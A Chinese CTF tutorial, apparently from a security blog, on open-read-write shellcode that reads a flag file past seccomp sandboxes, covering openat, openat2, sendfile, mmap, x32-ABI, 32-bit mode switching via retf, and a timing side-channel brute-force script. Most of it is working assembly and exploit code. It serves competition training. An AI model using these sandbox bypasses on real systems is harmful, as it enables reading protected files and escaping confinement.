@@ -1,0 +1,402 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="04fdcaaa910959a50fd5f38325ae4c18">最简单没限制的ORW</h2>
+<p>64位</p>
+<pre><code>push 0x67616c66
+mov rdi,rsp
+xor esi,esi
+push 2
+pop rax
+syscall
+mov rdi,rax
+mov rsi,rsp
+mov edx,0x100
+xor eax,eax
+syscall
+mov edi,1
+mov rsi,rsp
+push 1
+pop rax
+syscall</code></pre>
+<p>32位</p>
+<pre><code>push 0
+push 0x67616c66
+push esp  
+pop ebx
+xor ecx,ecx
+push 5
+pop eax
+int 0x80
+
+push rax   open后rax为3
+pop ebx
+push esp
+pop ecx
+push len
+pop edx
+push 3
+pop eax
+int 0x80
+
+push 1
+pop ebx
+push esp
+pop ecx
+push 0x50
+pop edx
+push 4
+pop eax
+int 0x80</code></pre>
+<h2 data-content="1" id="4182e89429a092a8d438e8c98470a8a9">ORW缺O的情况</h2>
+<h3 data-content="1" id="82060848fbc2a705d8dd5bc4496e48c6">1.只ban了 open函数</h3>
+<p>攻击方式 利用openat 函数</p>
+<p>1.系统调用号是257</p>
+<p>2.int openat(int dirfd, const char *pathname, int flags);只需要构造openat(0, '/flag\x00')  剩下流程一样</p>
+<pre><code>push 0x67616c66
+    mov rsi,rsp
+    xor rdx,rdx
+    mov rdi,0xffffff9c
+    push 257
+    pop rax
+    syscall
+    mov rdi,rax
+    mov rsi,rsp
+    mov edx,0x100
+    xor eax,eax
+    syscall
+    mov edi,1
+    mov rsi,rsp
+    push 1
+    pop rax
+    syscall</code></pre>
+<p>openat的参数得是这样</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215540-544e71da-8bc6-1.png"/></p>
+<p>这个位置rdi要设置为0xfffff9c</p>
+<h3 data-content="1" id="b5c8c7d0eb572767a618c4a7886e52a6">2.ban 了 open和openat函数</h3>
+<p>攻击方式利用 x32-abi或者转化64位模式位为32位模式 进行32位的shellcode orw 利用<br/>
+x32-abi和转化为32位的具体解析 放在后面了</p>
+<h3 data-content="1" id="c8d9c435ae2d151c5c33084b2cd3990c">3.ban了 x32-abi   64位模式转换 和open  openat 函数</h3>
+<p><code>openat2</code> 系统调用在 Linux 内核版本 5.6 中引入  所以linux内核版本 不能太低 不然赛题中可能用不上</p>
+<p>使用openat2函数  感觉出题者没注意的话 用这种可以通杀</p>
+<p>用shellcraft就是 shellcode=asm(shellcraft.openat2(-100,flag_addr,flag_addr+0x20,0x18))</p>
+<pre><code>push rax
+    xor rdi, rdi
+    sub rdi, 100
+    mov rsi, rsp
+    push 0
+    push 0
+    push 0
+    mov rdx, rsp
+    mov r10, 0x18
+    push 437
+    pop rax
+    syscall
+    mov rdi,rax
+    mov rsi,rsp
+    mov edx,0x100
+    xor eax,eax
+    syscall
+    mov edi,1
+    mov rsi,rsp
+    push 1
+    pop rax
+    syscall</code></pre>
+<p>参数情况如下图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215554-5c84a96e-8bc6-1.png"/></p>
+<p>以上基本是出现在return kill的情况</p>
+<h3 data-content="1" id="6e44daaccdfc3e2fc52f848e4834538e">return trace的打法</h3>
+<p>而如果是 以上全都被ban了，然后是return trace的话 又是另一种打法 整体可能会比较复杂 具体原理放到另一篇文章讲</p>
+<h2 data-content="1" id="d6dbb36018be2a3f60aa6c069f221884">ORW缺R的情况</h2>
+<p>1.用sendfile函数 来代替R和W</p>
+<pre><code>mov rax,0x67616c662f
+    push rax
+    push 257
+    pop rax
+    mov rsi, rsp
+    xor rdi, rdi
+    xor rdx,rdx
+    xor r10,r10
+    syscall
+    /* call sendfile(1, 'rax', 0, 0x100) /
+    mov r10d, 0x100
+    mov rsi, rax
+    push 40 / sendfile的系统调用号0x28 */
+    pop rax
+    push 1
+    pop rdi
+    xor rsi,rsi
+    mov rsi,3
+    xor rdx,rdx
+    syscall</code></pre>
+<p>2.pread64、readv、preadv、preadv2系统调用</p>
+<p>3.mmap函数：将文件映射到内存中</p>
+<pre><code>shellcode=asm(shellcraft.open('flag'))
+shellcode+=asm(shellcraft.mmap(0x10000,0x100,1,1,'eax',0))
+shellcode+=asm(shellcraft.write(1,0x10000,0x100))</code></pre>
+<pre><code>mov rax,0x67616c662f2e
+mov rsi,0
+mov rdx,0
+push rax
+mov rax,2
+push rsp
+pop rdi
+syscall
+
+mov rdi,0
+mov rsi,0x100
+mov rdx,7
+mov rcx,2
+mov r10,2
+mov r8,rax
+mov r9,0
+mov rax,9
+syscall
+
+push rax
+pop rsi
+mov rax,1
+mov rdi,1
+mov rdx,0x40
+syscall</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215614-68429770-8bc6-1.png"/></p>
+<h2 data-content="1" id="3e0d797343f626963acfd561013c1074">ORW缺W的情况</h2>
+<p>爆破类型:测信道爆破</p>
+<p>不爆破类型:替换函数<strong>pwrite64、writev</strong></p>
+<p>替换这种的话 关键还是看汇编和对函数的了解能力</p>
+<p>这里重点讲一下测信道爆破的打法：</p>
+<p>这里的原理是 通过 把flag读到地址上，然后逐字节比较：</p>
+<p>这里参考一下这位大佬的爆破脚本：<a href="https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/" target="_blank">2024VNCTF--PWN · Feng_ZZ's Studio (feng-zz-pwn.github.io)</a></p>
+<pre><code>def pwn():
+    global s
+    flag = ''
+    count = 1
+    for i in range(len(flag), 0x50):
+        left = 32
+        right = 127
+        while left &lt; right:
+            s = process('./ezshell')
+            # s = remote('node2.hackingfor.fun', 38235)
+            getshellcode()
+            mid = (left + right) &gt;&gt; 1
+            orw_shellcode = f'''
+                mov rdi, 0x67616c662f2e
+                push rdi
+                mov rdi, rsp
+                mov rsi, 0
+                mov rdx, 0
+                mov rax, 2
+                syscall
+                mov rdi, 3
+                mov rsi, rsp
+                mov rdx, 0x100
+                mov rax, 0
+                syscall
+                mov dl, byte ptr [rsp+{i}]
+                mov cl, {mid}
+                cmp dl, cl
+                ja loop
+                ret
+                loop:
+                jmp loop
+            '''
+            s.sendline(asm(orw_shellcode))
+            start_time = time.time()
+            try:
+                s.recv(timeout=0.2)
+                if(time.time() - start_time &gt; 0.1):
+                    left = mid + 1
+            except:
+                right = mid
+            s.close()
+            log.info('time--&gt;' + str(count))
+            log.info(flag)
+            count += 1
+        flag += chr(left)
+        log.info(flag)
+        if(flag[-1] == '}'):
+            break</code></pre>
+<h2 data-content="1" id="c70270e9b0685294f84d42526630c7c2">调用x32 ABI</h2>
+<p>​   x32 ABI是ABI (Application Binary Interface)，同样也是linux系统内核接口之一。x32 ABI允许在64位架构下（包括指令集、寄存器等）使用32位指针，从而避免64位指针造成的额外开销，提升程序性能。然而，除跑分、嵌入式场景外，x32 ABI的使用寥寥无几。前几年曾有过弃用x32 ABI的讨论，但其被最终决定保留，并在linux kernel中保留至今。</p>
+<h3 data-content="1" id="eb4d8ef2306e42e5ab819d8838b8515f">利用方式</h3>
+<p>x32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。</p>
+<p>具体的调用表可以查看系统头文件中的<code>/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h</code></p>
+<pre><code>#ifndef _UAPI_ASM_UNISTD_X32_H
+#define _UAPI_ASM_UNISTD_X32_H
+
+#define __NR_read (__X32_SYSCALL_BIT + 0)
+#define __NR_write (__X32_SYSCALL_BIT + 1)
+#define __NR_open (__X32_SYSCALL_BIT + 2)
+#define __NR_close (__X32_SYSCALL_BIT + 3)
+
+.........
+
+#endif /* _UAPI_ASM_UNISTD_X32_H */</code></pre>
+<p>其中，<code>__x32_SYSCALL_BIT</code>为0x40000000，由头文件<code>/usr/src/linux-headers-$version-generic/arch/x86/include/uapi/asm/unistd.h</code>定义：</p>
+<pre><code>#ifndef _UAPI_ASM_X86_UNISTD_H
+#define _UAPI_ASM_X86_UNISTD_H
+
+/*
+ * x32 syscall flag bit.  Some user programs expect syscall NR macros
+ * and __X32_SYSCALL_BIT to have type int, even though syscall numbers
+ * are, for practical purposes, unsigned long.
+ *
+ * Fortunately, expressions like (nr &amp; ~__X32_SYSCALL_BIT) do the right
+ * thing regardless.
+ */
+#define __X32_SYSCALL_BIT   0x40000000
+
+#ifndef __KERNEL__
+# ifdef __i386__
+#  include &lt;asm/unistd_32.h&gt;
+# elif defined(__ILP32__)
+#  include &lt;asm/unistd_x32.h&gt;
+# else
+#  include &lt;asm/unistd_64.h&gt;
+# endif
+#endif
+
+#endif /* _UAPI_ASM_X86_UNISTD_H */</code></pre>
+<h3 data-content="1" id="7904b55661d0b942584f746984e79830">利用条件：</h3>
+<p>没限制系统号&lt;0x4000000000</p>
+<h3 data-content="1" id="80a903d7b3cc1dc8b8e5819b495c9215">[TSCTF-J 2022] Easy Shellcode</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215806-ab39fd2a-8bc6-1.png"/></p>
+<p>其实也就是把系统调用号调为了 0x40000000之后 为x32-abi，其实就是在原来的系统调用基础上加上一个值</p>
+<pre><code>lea rax,[rip]
+add rax,0x200
+mov rsp,rax ;  因为rsp被清空，先将栈迁移至可读写位置
+
+mov eax,0x67616c66 ;  'flag'
+push rax
+mov rdi,rsp
+xor rsi,rsi
+mov rax,0x40000002 ;  open
+syscall
+
+mov rdi,rax
+mov rax,rsp
+add rax,0x100
+mov rsi,rax
+mov rdx,0x40
+mov rax,0x40000000 ;  read
+syscall
+
+mov edi,2
+mov rax,0x40000001 ;  write
+syscall</code></pre>
+<h2 data-content="1" id="d1c3f68a0325bc597cdc35deb31f3e3f">使用32位模式</h2>
+<h3 data-content="1" id="a5fcf436b73a7eec736f9c13160c75a9">32位模式</h3>
+<p>32位模式即64位系统下运行32位程序的模式，此时CS寄存器的值为<strong>0x23</strong>。在该模式下，程序与在32位系统中运行几乎无异，即只能使用32位寄存器，所有指针必须为32位，指令集为32位指令集等。与之相对地，64位模式对应的CS寄存器的值为<strong>0x33</strong>。</p>
+<h3 data-content="1" id="8b4a91f49b513581239f8dc822d33ad3">进入32位模式</h3>
+<p>进入32位模式需要更改CS寄存器为0x23。retf (far return) 指令可以帮助我们做到这一点。retf指令相当于：</p>
+<pre><code>pop ip
+pop cs</code></pre>
+<p>需要注意的是，在使用pwntools构造shellcode时，需要指定retf的地址长度，即可以使用retfd和retfq。</p>
+<h3 data-content="1" id="4bf21ecc56f5c8cea80592a7db5a4897">利用方式</h3>
+<p>因为进入32位模式后，sp, ip寄存器也会变成32位，所以需要将栈迁移至32位地址上；利用或构造32位地址的RWX内存段，写入32位shellcode；最后在栈上构造fake ip, cs，执行retf指令。</p>
+<h3 data-content="1" id="3ea629b9a0e1378b36c877fa28dd061f">利用条件</h3>
+<ul>
+<li>沙箱中不包含对arch==ARCH_x86_64的检测</li>
+<li>存在或可构造32位地址的RWX内存段</li>
+</ul>
+<p>其中，构造RWX内存段可使用mmap申请新的内存，或使用mprotect使已有的段变为RWX权限</p>
+<h3 data-content="1" id="255d8f746cd7a6b9df189bab64726ca3">[CrossCTF Quals 2018] Impossible Shellcoding</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215819-b32cae6a-8bc6-1.png"/></p>
+<p>创建一个mmap位置，然后读入32位的shellcode 然后64位转化为32位</p>
+<p>这里补充一下mmap的利用说明</p>
+<p>mmap将一个文档或者其它对象映射进内存。文档被映射到多个页上，如果文档的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。<br/>
+头文档 &lt;sys/mman.h&gt;</p>
+<p>void<em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset);<br/>
+第一个参数：分配新内存的地址<br/>
+第二个参数：新内存的长度（0x1000的倍数），长度单位是字节，不足一内存页按一内存页处理<br/>
+第三个参数：期望的内存保护标志，不能与文档的打开模式冲突。<br/>
+            PROT_EXEC（可执行）在内存中用4来表示<br/>
+            PROT_READ（可读）在内存中用1来表示<br/>
+            PROT_WRITE（可写）在内存中用2来表示<br/>
+            PROT_NONE（不可访问）在内存中用0来表示<br/>
+第四个参数：映射的类型<br/>
+            MAP_FIXED（）在内存中用10来表示<br/>
+            MAP_SHARED（）在内存中用1来表示<br/>
+            MAP_PRIVATE（）在内存中用2来表示<br/>
+            MAP_NORESERVE（）在内存中用4000来表示<br/>
+            MAP_LOCKED（）在内存中用2000来表示<br/>
+第五个参数：文档描述符，可设为0<br/>
+第六个参数：如果为文档映射，则此处代表定位到文档的那个位置，然后开始向后映射。</p>
+<p>函数返回值：<br/>
+    若该函数执行成功，mmap()返回被映射区的指针，失败时返回MAP_FAILED（-1）</p>
+<p>可以通过mmap来申请出一段有读写执行权限的<a href="https://so.csdn.net/so/search?q=内存&amp;spm=1001.2101.3001.7020" target="_blank">内存</a>，通常<strong>mmap(target_addr,0x1000,7,34,0,0)</strong>，这里target_addr需要页对齐也就是0x1000的整数倍，若不对齐，申请到的起始地址将不是target_addr。</p>
+<pre><code>xor rax, rax         ; 将 rax 寄存器清零，等价于 rax = 0
+mov al, 9            ; 将 rax 的低 8 位设置为 9（系统调用号 9 对应 mmap）
+mov rdi, 0x602000    ; 将 mmap 的第一个参数（地址）设置为 0x602000
+mov rsi, 0x1000      ; 将 mmap 的第二个参数（长度）设置为 0x1000（4096 字节）
+mov rdx, 7           ; 将 mmap 的第三个参数（保护标志）设置为 7（读/写/执行）
+mov r10, 0x32        ; 将 mmap 的第四个参数（映射类型）设置为 0x32（MAP_PRIVATE | MAP_ANONYMOUS）
+mov r8, 0xffffffff    ; 将 mmap 的第五个参数（文件描述符）设置为 -1
+mov r9, 0            ; 将 mmap 的第六个参数（偏移量）设置为 0
+syscall              ; 执行系统调用
+
+mov rax, 0
+xor rdi, rdi
+mov rsi, 0x602590
+mov rdx, 100
+syscall ; read x86 shellcode
+
+xor rsp, rsp
+mov esp, 0x602160
+mov DWORD PTR [esp+4], 0x23 ; set CS register
+mov DWORD PTR [esp], 0x602590 ; set new eip
+retfd</code></pre>
+<p>32位的shellcode(orw)</p>
+<pre><code>push 0
+push 0x67616c66
+push esp
+pop ebx
+xor ecx,ecx
+push 5
+pop eax
+int 0x80
+
+push eax
+pop ebx
+push esp 
+pop ecx                                          
+push 0x50
+pop edx
+push 3
+pop eax
+int 0x80
+
+push 1
+pop ebx
+push esp
+pop ecx
+push 0x50
+pop edx
+push 4
+pop eax
+int 0x80</code></pre>
+<p>汇编转化为字节码的  因为不是64位的架构不同 不能用asm(shellcode)这种直接进行转化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215833-bb35be3a-8bc6-1.png"/></p>
+<p>网站：<a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">Online x86 and x64 Intel Instruction Assembler (defuse.ca)</a></p>
+<p>转化后为\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x6A\x50\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x6A\x50\x5A\x6A\x04\x58\xCD\x80</p>
+<h3 data-content="1" id="938803fc550c22cf3d70024c6a34e6d6">动态调试部分如下：</h3>
+<p>mmap一块新地址 来存放32位shellcode</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215842-c09afc14-8bc6-1.png"/></p>
+<p>读入32位shellcode</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215850-c547f168-8bc6-1.png"/></p>
+<p>转为32位模式 返回 shellcode存入的位置</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215902-cc8bc760-8bc6-1.png"/></p>
+<p>open</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215908-d076ec9c-8bc6-1.png"/></p>
+<p>read</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215915-d4493aa0-8bc6-1.png"/></p>
+<p>write</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215922-d8b39266-8bc6-1.png"/></p>
+<p>成功获得flag：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241016215928-dc65cf8c-8bc6-1.png"/></p>
+<p>参考文献:<br/>
+<a href="https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/" target="_blank">https://feng-zz-pwn.github.io/2024/02/26/2024VNCTF-PWN/</a><br/>
+<a href="https://www.cnblogs.com/pwnfeifei/p/15746588.html" target="_blank">https://www.cnblogs.com/pwnfeifei/p/15746588.html</a><br/>
+<a href="https://blog.csdn.net/2301_79326813/article/details/140902801" target="_blank">https://blog.csdn.net/2301_79326813/article/details/140902801</a><br/>
+<a href="https://www.man7.org/linux/man-pages/man2/openat2.2.html" target="_blank">https://www.man7.org/linux/man-pages/man2/openat2.2.html</a></p>
+</div>
+</div>
